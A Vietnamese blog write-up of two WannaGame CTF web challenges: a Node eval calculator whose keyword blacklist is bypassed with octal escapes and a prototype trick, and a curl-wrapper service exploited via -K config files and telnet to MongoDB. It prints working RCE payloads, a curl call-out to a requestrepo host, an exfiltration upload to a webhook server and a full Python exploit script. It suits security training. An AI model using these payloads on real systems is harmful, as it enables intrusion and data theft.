Symbol.hasInstance không? Nếu có thì sẽ thực thi gọi tới a.sort là this và toString.constructor (AKA Function) là tham số truyền vào Khi a.sort(function sort) được gọi đến thì bình thường thì nó sẽ cố gắng chuyển tất cả các phần tử trong mảng thành string bằng hàm toString() rồi so sánh bằng function truyền vào. Điều này vô tình trigger hàm call() chúng ta đã đổi ở lúc đầu và bây giờ cả array sẽ trở thành parameter của new Function Nói thêm ở phần này về lý do phải set b[__proto__]=a là vì sort là function của array nên chúng ta phải đổi prototype của nó thành array thì sort mới có thể được thực thi và hơn hết khi đó sort sẽ được thực thi trên b, b lúc này là một object nên sort sẽ cố gắng tìm kiếm array trong object này bằng cách tìm kiếm trong prototype của nó khi đó nó sẽ tìm được 1 array trong vì ta set prototype của b là a Giá trị return của new Function này sẽ là một anonymous với a[0] là function và a[1] là parameter 1 2 3 4 (function anonymous(x ) { process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http://yh9wz5br.requestrepo.com&#39;) }) Để nói thêm một chút nữa thì flow của chương trình sẽ như sau trigger sort -&gt; sort nhận Function làm tham số -&gt; Function là hàm được sử dụng để ‘so sánh’ các phần tử bên trong mảng -&gt; Mỗi phần từ được chuyển qua string(trigger call function) -&gt; Trả về một anonymouse function -&gt; Cuối cùng giá trị sau khi ‘so sánh’ sẽ được trả về dưới dạng string (trigger call function) Đây là code mô phỏng lại quá trình sort 1 2 3 toString.constructor.prototype.toString=Function.call; Function(a[1].toString(),a[0].toString()).toString(); Từ đó ta RCE và lấy được flag Flag: W1{hehehe} P/S: thật ra cách này đúng là “dùng dao mổ trâu để giết gà” vì cách này dùng cho những bài với filter chặt và bị hạn chế nhiều thứ. Do mình có sử dụng cách này khi thi nên tiện thể phân tích luôn cách này CURR 1 2 3 4 5 6 Let explore my website!!! Author: dcthinh http://45.122.249.68:20014 Tóm tắt về source code của trang web này App này có 3 route ,/ , /api/login và /api/curr và mình sẽ tập trung vào route /api/curr Route này có chức năng là dùng lệnh curl với các options như là -d, …, và có một cái middleware là /api/login để kiểm tra login Users và Flag được lưu trong mongoDB và đọc code một lúc thì không có cách nào để login hay bypass login cả 1 2 3 4 5 6 7 const crypto = require(&quot;crypto&quot;); const app = db.getSiblingDB(&#39;app&#39;); app.users.insertOne({ user: &quot;admin&quot;, pass: crypto.randomBytes(64).toString(&quot;hex&quot;) }); const secret = db.getSiblingDB(&#39;secret&#39;); secret.flag.insertOne({ flag: process.env.FLAG || &quot;W1{REACTED}&quot; }); Nhưng nhìn kỉ lại midleware thì mình thấy một điều khá là lạ 1 2 3 4 5 6 7 const requiresLogin = (req, res, next) =&gt; { if (!req.session.user) { res.redirect(&quot;/?error=login first&quot;); } next(); }; Vì sao lại có next(); ở dưới cùng của middleware này, mình nghĩ là có vẻ như là dù không có login nhưng vẫn có thể đi tới endpoint sau chăng ? Và đúng là thế, nó sẽ chạy phần code phía sau nhưng mà chúng ta không thể thấy phần output thôi Đến phần /api/curr 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 app.post(&quot;/api/curr&quot;, requiresLogin, (req, res) =&gt; { let { url } = req.body; if (!url || typeof url !== &quot;string&quot;) { return res.json({ success: false, message: &quot;Invalid URL&quot; }); } try { let parsed = new URL(url); if (![&quot;http:&quot;, &quot;https:&quot;].includes(parsed.protocol)) throw new Error(&quot;Invalid URL&quot;); } catch (e) { return res.json({ success: false, message: e.message }); } const args = [ url ]; let { opt, data } = req.body; if (opt &amp;&amp; data &amp;&amp; typeof opt === &quot;string&quot; &amp;&amp; typeof data === &quot;string&quot;) { if (!/^-[A-Za-z]$/.test(opt)) { return res.json({ success: false, message: &quot;Invalid option&quot; }); } // check method if (opt === &quot;-d&quot; || [&quot;GET&quot;, &quot;POST&quot;].includes(data)) { args.push(opt, data); } } cp.spawn(&#39;curl&#39;, args, { timeout: 2000, cwd: &quot;/tmp&quot; }).on(&#39;close&#39;, (code) =&gt; { // save result to database res.json({ success: true, message: `The site is ${code === 0 ? &#39;up&#39; : &#39;down&#39;}` }); }); }); Phần này sẽ lấy URL của chúng ta và kiểm tra nó sau đó kiểm tra phần opt nếu nó qua được phần kiểm tra thì sẽ thực thi lệnh curr với các options mà ta thêm vào Phần kiểm tra opt khá là chặt. Đầu tiên kiểm tra xem opt có bắt đầu bằng - và sau đó 1 là 1 ký tự [a-zA-Z] không, tiếp sau đó kiểm tra opt một là -d và là data hay là 1 option bất kỳ và có data là GET, hoặc là POST. Và curl có hỗ trợ một options là -K (–config) option này giúp cho lệnh curl của chúng ta đọc từ một file text và sử dụng nó làm các options. Từ đó suy ra nếu mà có cách nào đó để chúng ta download file options của chúng ta về server và bắt server curl với options đó ta có thể curl tới bất kỳ URL nào Để thử thì đây là options thử nghiệm 1 2 --url &quot;http://XXXXXX.requestrepo.com&quot; user-agent = &quot;yuu&quot; Ta có thể setup một python http server và expose bằng ngrok để và dùng curl để download file bằng cách sau 1 url =xxxxx.NGROK.com/options.txt&amp;opt=-o&amp;data=GET Tiếp tục ta thử xem liệu nó có request đến server của mình với useragent là yuu không 1 url =xxxxxx.webhook.com&amp;opt=-K&amp;data=GET Vậy là có thể gửi tới bất kỳ url nào với bất kỳ options nào mà ta muốn Vậy với những thứ này thì làm sao lấy flag từ mongoDB đây? MongoDB giao tiếp thông qua MongoDB Wire Protocol. Người dùng có thể giao tiếp với database server thông qua TCP/IP. Vậy chúng ta có thể dùng gopher để và dùng curl để connect tới database server và lấy flag, nhưng tiếc là chúng ta không thể dùng gopher vì author đã set up như bên dưới Nhưng mà vẫn có một số protocol khác như telnet khi mà chúng cũng giao tiếp bằng TCP Vậy ta có thể gửi một binary file(TCP transfer - file này chứa một giao tiếp lấy flag) cho mongo database server để server trả cái flag về Ta có thể bắt file này bằng cách tạo một file để giả lập việc lấy flag và sử dụng tcpdump để bắt gói tin đó File js dùng để lấy flag 1 2 3 4 5 6 7 8 const { MongoClient } = require( &quot;mongodb&quot; ); const client = new MongoClient( &quot;mongodb://mongodb:27017/&quot; ); client.connect().then(async () =&gt; { const flag = client.db( &quot;secret&quot; ).collection( &quot;flag&quot; ); var flag_1 = await flag.findOne() console.log(flag_1); client.close(); } ); Đây là nội dung lúc giao tiếp với server Ta có thể tải nội dung TCP payload về, đây chính là quá trình mà server giao tiếp với database Thử dùng file này để giao tiếp xem có được không Nó có trả về flag vậy có nghĩa là chúng ta có thể dùng cách này Vậy cuối cùng đây là cách làm Tải file options với nội dung bên dưới url=http://NGROKSERVER.com/options.txt&amp;opt=-o&amp;data=GET 1 2 3 4 --max-time 1 --upload-file &quot;POST&quot; --url &quot;telnet://mongodb:27017&quot; -o &quot;GET&quot; Tiếp theo tải file data tcp mà ta bắt được vào server url=http://NGROKSERVER.com/test.data.dat&amp;opt=-o&amp;data=POST Sau đó request đến một trang web bất kỳ với option là file GET(options mà ta lúc nãy gửi) url=http://ABCXYZ.COM&amp;opt=-K&amp;data=GET ( lúc này là lúc mà chúng ta giao tiếp với database để lấy flag và lưu vào GET) Cuối cùng là upload file GET về server của ta url=http://WEBHOOKSERVER.COM&amp;opt=-T&amp;data=GET Payload tự động lấy flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 import requests import time # URL = &quot;http://localhost:8888&quot; URL = &quot;http://45.122.249.68:20014&quot; data = { &quot;url&quot;: &quot;https://NGROKSERVER/options.txt&quot;, &quot;opt&quot;: &quot;-o&quot;, &quot;data&quot;: &quot;GET&quot; } r = requests.post(f&quot;{URL}/api/curr&quot;, data=data) time.sleep(1) data = { &quot;url&quot;: &quot;https://NGROKSERVER/test.data.dat&quot;, &quot;opt&quot;: &quot;-o&quot;, &quot;data&quot;: &quot;POST&quot; } r = requests.post(f&quot;{URL}/api/curr&quot;, data=data) time.sleep(1) data = { &quot;url&quot;: &quot;http://ABCXYZ.COM&quot;, &quot;opt&quot;: &quot;-K&quot;, &quot;data&quot;: &quot;GET&quot; } r = requests.post(f&quot;{URL}/api/curr&quot;, data=data) time.sleep(5) data = { &quot;url&quot;: &quot;http://WEBHOOKSERVER.COM&quot;, &quot;opt&quot;: &quot;-T&quot;, &quot;data&quot;: &quot;GET&quot; } r = requests.post(f&quot;{URL}/api/curr&quot;, data=data) Flag: W1{nice_try_without_gopher} Kết bài","headline":"WannaGame","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Wannagame2024/"},"url":"http://localhost:4000/posts/Wannagame2024/"}</script>
<!-- End Jekyll SEO tag -->


  <title>WannaGame | Yuu's blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Yuu's blog">
<meta name="application-name" content="Yuu's blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    
      <link rel="preconnect" href="https://cdnjs.cloudflare.com" >
      <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.25.0/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  
    <!-- Switch the mode between dark and light. -->

<script type="text/javascript">
  class ModeToggle {
    static get MODE_KEY() {
      return 'mode';
    }
    static get MODE_ATTR() {
      return 'data-mode';
    }
    static get DARK_MODE() {
      return 'dark';
    }
    static get LIGHT_MODE() {
      return 'light';
    }
    static get ID() {
      return 'mode-toggle';
    }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      let self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addEventListener('change', () => {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }
          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.notify();
      });
    } /* constructor() */

    get sysDarkPrefers() {
      return window.matchMedia('(prefers-color-scheme: dark)');
    }

    get isSysDarkPrefer() {
      return this.sysDarkPrefers.matches;
    }

    get isDarkMode() {
      return this.mode === ModeToggle.DARK_MODE;
    }

    get isLightMode() {
      return this.mode === ModeToggle.LIGHT_MODE;
    }

    get hasMode() {
      return this.mode != null;
    }

    get mode() {
      return sessionStorage.getItem(ModeToggle.MODE_KEY);
    }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    setDark() {
      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      document.documentElement.removeAttribute(ModeToggle.MODE_ATTR);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    /* Notify another plugins that the theme mode has changed */
    notify() {
      window.postMessage(
        {
          direction: ModeToggle.ID,
          message: this.modeStatus
        },
        '*'
      );
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }
        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }
      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.notify();
    } /* flipMode() */
  } /* ModeToggle */

  const modeToggle = new ModeToggle();
</script>

  

  <!-- A placeholder to allow defining custom metadata -->

</head>

  <!-- <style>
    body {
      background-image: url('/assets/background/background.jpg');
    }
    </style> -->

  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="https://pbs.twimg.com/profile_images/1771461862468579328/HqACG5Vs_400x400.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">Yuu's blog</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">I will write some CTF writeup here :v</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="mode-toggle btn" aria-label="Switch Mode">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
        <a
          href="https://github.com/anzuukino"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/anzuukino"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['example','domain.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->

    
    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>WannaGame</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>WannaGame</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1718380800"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Jun 14, 2024
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://github.com/anzuukino">Yuu</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2060 words"
>
  <em>11 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  <div class="content">
    <p>WannaGame vừa mới kết thúc, mình xin viết lại một số bài mà mình làm được, giải này mình khá may mắn khi giải được 2 bài và mình cũng học được rất nhiều thứ từ giải này.</p>

<p><a href="/assets/wannagame/1.png" class="popup img-link  shimmer"><img src="/assets/wannagame/1.png" alt="alt text" loading="lazy"></a></p>

<h2 id="newchall"><span class="me-2">newchall</span><a href="#newchall" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>This is a simple calc program,let's try /exec?q=9*10.

Author: dcthinh

http://45.122.249.68:20011
</pre></td></tr></tbody></table></code></div></div>

<p>Bài này cho một trang web có chức năng như trên và mình đoán khá là chắc rằng tất cả những gì mình nhập vào sẽ được đưa vào eval nên chúng ta cứ thử một số payload đơn giản vào trước.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">child_process</span><span class="dl">"</span><span class="p">).</span><span class="nf">spawnSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">ls</span><span class="dl">'</span><span class="p">).</span><span class="nx">output</span><span class="p">.</span><span class="nf">toString</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Và có vẻ như là bị chặn, mình nghĩ là có thể chặn một số từ khóa như <code class="language-plaintext highlighter-rouge">require</code> hoặc <code class="language-plaintext highlighter-rouge">child_process</code> nên mình sẽ thử một số payload khác</p>

<p><strong>Payload 1:</strong></p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">global</span><span class="p">.</span><span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">).</span><span class="nf">execSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">ls</span><span class="dl">'</span><span class="p">).</span><span class="nf">toString</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Tất nhiên cái này sẽ bị chặn vì có từ khóa <code class="language-plaintext highlighter-rouge">require</code> nên mình sẽ tìm cách để bypass cái này. Chúng ta có thể gọi require như sau</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">global</span><span class="p">.</span><span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">[</span><span class="dl">"</span><span class="s2">require</span><span class="dl">"</span><span class="p">]</span>
</pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/wannagame/2.png" class="popup img-link  shimmer"><img src="/assets/wannagame/2.png" alt="alt text" loading="lazy"></a></p>

<p>Ta có thể đổi <code class="language-plaintext highlighter-rouge">require</code> thành <code class="language-plaintext highlighter-rouge">requir\145</code> (\145 là mã octal của e) vì trong quá trình thực thi <code class="language-plaintext highlighter-rouge">requir\145</code> sẽ được chuyển thành <code class="language-plaintext highlighter-rouge">require</code> và chúng ta có thể lợi dụng cái này để bypass filters</p>

<p>Payload cuối cùng</p>
<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">global</span><span class="p">.</span><span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">[</span><span class="dl">"</span><span class="s2">requir</span><span class="se">\</span><span class="s2">145</span><span class="dl">"</span><span class="p">](</span><span class="dl">'</span><span class="s1">chil</span><span class="se">\</span><span class="s1">144_proces</span><span class="se">\</span><span class="s1">163</span><span class="dl">'</span><span class="p">)[</span><span class="dl">"</span><span class="s2">spaw</span><span class="se">\</span><span class="s2">156Sy</span><span class="se">\</span><span class="s2">156c</span><span class="dl">"</span><span class="p">](</span><span class="dl">'</span><span class="s1">cat</span><span class="dl">'</span><span class="p">,[</span><span class="dl">'</span><span class="s1">flag.txt</span><span class="dl">'</span><span class="p">]).</span><span class="nx">output</span><span class="p">.</span><span class="nf">toString</span><span class="p">();</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Và mình có được flag</p>

<p><a href="/assets/wannagame/3.png" class="popup img-link  shimmer"><img src="/assets/wannagame/3.png" alt="alt text" loading="lazy"></a></p>

<p>Sau khi dump ra được source thì đây là các chuỗi bị chặn</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nx">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="dl">'</span><span class="s1">system</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">exec</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">spawn</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">eval</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">require</span><span class="dl">'</span><span class="p">];</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Payload 2:</strong></p>

<p>Note: Cách này mình đã đọc được từ writeup của các giải amstrong2024 và TSG2023 và tham khảo của anh shin24 link mình sẽ đính kèm bên dưới</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
